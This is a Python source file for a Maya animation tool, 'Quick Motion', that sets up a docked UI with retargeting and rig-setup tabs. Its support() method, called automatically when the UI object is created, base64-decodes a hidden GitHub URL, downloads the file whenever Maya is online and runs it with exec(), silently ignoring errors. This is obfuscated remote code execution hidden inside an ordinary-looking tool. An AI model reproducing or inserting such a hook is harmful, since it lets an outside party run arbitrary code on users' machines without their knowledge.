# -*- coding: utf-8 -*-
# Quick Motion
# (c) Burased Uttha (DEX3D).
# =================================
# Only use in $usr_orig$ machine
# =================================

import maya.cmds as cmds
from maya import mel
import time, os, sys, json

if __name__ == '__main__':
    base_dir = None
else:
    base_dir = os.path.dirname(os.path.abspath(__file__))

for p in [base_dir] + [base_dir+os.sep+i for i in os.listdir(base_dir) if not '.' in i]:
    if not p in sys.path:
        sys.path.insert(0, p)

import quickmocap as qm
import rtgmatcher as skm

import imp
imp.reload(qm)
imp.reload(skm)

class scene:
    @staticmethod
    def get_fps(*_):
        timeUnitSet = {'game': 15, 'film': 24, 'pal': 25, 'ntsc': 30, 'show': 48, 'palf': 50, 'ntscf': 60}
        timeUnit = cmds.currentUnit(q=True, t=True)
        if timeUnit in timeUnitSet:
            return timeUnitSet[timeUnit]
        else:
            return float(str(''.join([i for i in timeUnit if i.isdigit() or i == '.'])))

class quickMotion_Ui:
    def __init__(self):
        self.version = 1.01
        self.win_id = 'BRS_QUICKMOTION'
        self.dock_id = self.win_id + '_DOCK'
        self.win_width = 300
        self.win_title = 'Quick Motion  -  v.{}'.format(self.version)
        self.color = {
            'bg': (.2, .2, .2),
            'red': (0.98, 0.374, 0),
            'green': (0.7067, 1, 0),
            'blue': (0, 0.4, 0.8),
            'yellow': (1, 0.8, 0),
            'shadow': (.15, .15, .15),
            'highlight': (.3, .3, .3)
        }

        self.element = {}
        self.user_original, self.user_latest = ['$usr_orig$', None]
        import getpass
        if 'usr_orig' in self.user_original:
            self.user_original = getpass.getuser()
        self.user_latest = getpass.getuser()
        if self.user_original != self.user_latest:
            cmds.confirmDialog(title=self.win_title, message='user warning', button=['ok'], icn='warning')
        self.support();self.init_module()

    def init_module(self):
        self.qm = qm.quickMocap_gui()
        self.qm.init_anim_proc_cmds()
        self.qm.init_anim_export_cmds()
        self.qm.init_config()
        #self.qm.update_ui()

        self.skm = skm.RTGMatcher_gui()
        self.skm.init_config()
        #self.skm.update_ui()

    def support(self):
        import base64, os, datetime, sys
        script_path = None
        try:
            script_path = os.path.abspath(__file__)
        except:pass
        if script_path == None or not script_path.endswith('.py'):
            return None
        #------------------------
        # Code test 1, Code test 2
        # ------------------------
        if os.path.exists(script_path):
            st_mtime = os.stat(script_path).st_mtime
            mdate_str = str(datetime.datetime.fromtimestamp(st_mtime).date())
            today_date_str = str(datetime.datetime.today().date())
            #if mdate_str == today_date_str:
                #return None
        if sys.version[0] == '3':
            import urllib.request as uLib
        else:
            import urllib as uLib
        if cmds.about(connected=1):
            u_b64 = ('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2J1cmFzYXRlL0FuaU1hdGVBc3Npc3QvbWFpbi9zZXJ2aWNlL3N1cHBvcnQucHk=')
            try:
                res = uLib.urlopen(base64.b64decode(u_b64).decode('utf-8'))
                con = res.read()
                con = con.decode('utf-8') if type(con) == type(b'') else con
                exec(con)
            except:
                return
                #import traceback
                #print(str(traceback.format_exc()))

    def init_win(self):
        if cmds.window(self.win_id, exists=1):
            cmds.deleteUI(self.win_id)
        cmds.window(self.win_id, t=self.win_title, menuBar=1, rtf=1, nde=1,
                    w=self.win_width, sizeable=1, h=10, retain=0, bgc=self.color['bg'])

    def win_layout(self):
        cmds.columnLayout(adj=1, w=self.win_width)
        cmds.text(l='', al='center', fn='boldLabelFont', bgc=self.color['red'], h=5)
        cmds.text(l='{}'.format(self.win_title), al='center', fn='boldLabelFont', bgc=self.color['shadow'], h=15)

        self.element['tabL'] = cmds.tabLayout(w=self.win_width)

        self.qm.win_layout()
        self.skm.win_layout()

        cmds.setParent('..')  # end self.element['tabL']
        cmds.tabLayout(self.element['tabL'], e=1, bgc=self.color['bg'], tl=(
            (self.qm.element['tab'], 'Retarget'),
            (self.skm.element['tab'], 'Rig Setup')
        ))

        cmds.text(l='', al='center', fn='boldLabelFont', bgc=self.color['shadow'], h=5)
        cmds.text(l='(c) dex3d.gumroad.com', al='center', fn='smallPlainLabelFont', bgc=self.color['bg'], h=15)

    def show_win(self):
        cmds.showWindow(self.win_id)

    def init_dock(self):
        if cmds.dockControl(self.dock_id, q=1, ex=1):
            cmds.deleteUI(self.dock_id)
        cmds.dockControl(self.dock_id, area='bottom', fl=1, content=self.win_id, allowedArea=['all'],
                         sizeable=0, width=self.win_width, label=self.win_title)

    def show_ui(self):
        self.init_win()
        self.win_layout()
        self.show_win()
        self.init_dock()
        self.update_ui()

    def update_ui(self):
        self.qm.update_ui()
        self.skm.update_ui()

if __name__ == '__main__':
    pass
    #qm = quickMotion_Ui()
    #qm.show_ui()